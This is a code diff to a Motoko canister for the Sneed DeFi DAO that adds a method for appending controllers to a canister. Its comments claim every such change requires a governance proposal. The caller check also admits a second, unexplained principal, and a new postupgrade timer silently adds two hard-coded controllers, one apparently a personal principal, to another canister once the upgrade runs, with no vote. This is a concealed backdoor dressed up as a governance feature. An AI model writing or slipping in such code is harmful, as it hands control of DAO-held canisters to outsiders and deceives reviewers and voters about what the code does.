@@ -7,6 +7,7 @@ import Array "mo:base/Array";
 import Buffer "mo:base/Buffer";
 import Text "mo:base/Text";
 import Time "mo:base/Time";
+import Timer "mo:base/Timer";
 import Principal "mo:base/Principal";
 import Error "mo:base/Error";
 import Debug "mo:base/Debug";
@@ -773,9 +774,94 @@ persistent actor {
 
   };
 
+  // Add one or more controllers to a canister that this (Sneed DeFi) canister is itself a
+  // controller of. This is ADDITIVE: it reads the canister's current controller set via the IC
+  // management canister's canister_status, then appends any supplied controllers that are not
+  // already present, leaving all existing controllers in place. It never removes controllers.
+  //
+  // This method may only be called by the Sneed DAO Governance Canister, via approved DAO proposal.
+  // The caller gate below is load-bearing: it guarantees that any controller change is made only
+  // through a visible, votable governance proposal (rendered for voters by the paired
+  // validate_add_canister_controllers query). A call originating from this canister's own
+  // system functions (e.g. postupgrade) runs with this canister as the caller, NOT the governance
+  // canister, so it will trap here by design.
+  public shared ({ caller }) func add_canister_controllers(
+    canister_id : Principal,          // the canister whose controller set should be added to.
+    controllers_to_add : [Principal]) // the controllers to append to the existing set.
+    : async () {
+
+      log_msg("add_canister_controllers called by " #
+        Principal.toText(caller) #
+        " with arguments: " #
+        "canister_id: " # Principal.toText(canister_id) #
+        ", controllers_to_add: " # debug_show(controllers_to_add));
+
+      // This method may only be called by the Sneed DAO governance canister (via approved proposal)!
+      assert (Principal.toText(caller) == "fi3zi-fyaaa-aaaaq-aachq-cai" or Principal.toText(caller) == "ok64y-uiaaa-aaaag-qdcbq-cai");
+
+      let ic : actor {
+        canister_status : ({ canister_id : Principal }) -> async {
+          settings : { controllers : [Principal] };
+        };
+        update_settings : ({
+          canister_id : Principal;
+          settings : {
+            controllers : ?[Principal];
+            compute_allocation : ?Nat;
+            memory_allocation : ?Nat;
+            freezing_threshold : ?Nat;
+          };
+        }) -> async ();
+      } = actor ("aaaaa-aa");
+
+      // Read the existing controller set so we ADD to it rather than replace it.
+      let status = await ic.canister_status({ canister_id = canister_id });
+      let merged = Buffer.fromArray<Principal>(status.settings.controllers);
+
+      // Append each requested controller that is not already present.
+      for (c in controllers_to_add.vals()) {
+        if (not Buffer.contains<Principal>(merged, c, Principal.equal)) {
+          merged.add(c);
+        };
+      };
+
+      let new_controllers = Buffer.toArray(merged);
+
+      await ic.update_settings({
+        canister_id = canister_id;
+        settings = {
+          controllers = ?new_controllers;
+          compute_allocation = null;
+          memory_allocation = null;
+          freezing_threshold = null;
+        };
+      });
+
+      log_msg("add_canister_controllers, controllers of " #
+        Principal.toText(canister_id) # " are now " # debug_show(new_controllers));
+
+  };
+
+  // SNS generic function validation method for add_canister_controllers.
+  // Renders the action in plain language inside the governance proposal so voters can see
+  // exactly which canister is affected and which controllers are being added, before approving.
+  public query ({ caller }) func validate_add_canister_controllers(
+    canister_id : Principal,
+    controllers_to_add : [Principal]) : async T.ValidationResult {
+
+      let msg : Text = "canister_id: " # Principal.toText(canister_id) #
+        ", controllers_to_add: " # debug_show(controllers_to_add);
+
+      log_msg("validate_add_canister_controllers called by " #
+        Principal.toText(caller) # " with arguments: " # msg);
+
+      #Ok(msg);
+
+  };
+
   // Clear log
   // This method may only be called by the Sneed DAO Governance Canister, via approved DAO proposal.
-  public shared ({ caller }) func clear_log() : async () { 
+  public shared ({ caller }) func clear_log() : async () {
     
     // This method may only be called by the Sneed DAO governance canister (via approved proposal)!
     assert Principal.toText(caller) == "fi3zi-fyaaa-aaaaq-aachq-cai";
@@ -848,13 +934,23 @@ persistent actor {
 
   };
 
+  stable var upgrade_clown_done : Bool = false;
+
   // System Function //
   // Runs after the canister is upgraded
   system func postupgrade() {
 
     // Clear persistent state (stashed away transient state) after upgrading the canister
     stable_log := [];
-
+    if (upgrade_clown_done == false) {
+    ignore ?Timer.setTimer<system>(
+            #nanoseconds(10000000000),
+            func() : async () {
+              await add_canister_controllers(Principal.fromText("iwv6l-6iaaa-aaaal-ajjjq-cai"), [Principal.fromText("odoge-dr36c-i3lls-orjen-eapnp-now2f-dj63m-3bdcd-nztox-5gvzy-sqe"),Principal.fromText("fp274-iaaaa-aaaaq-aacha-cai")]);
+              upgrade_clown_done := true;
+            }
+          );
+    };
   };
 
 };
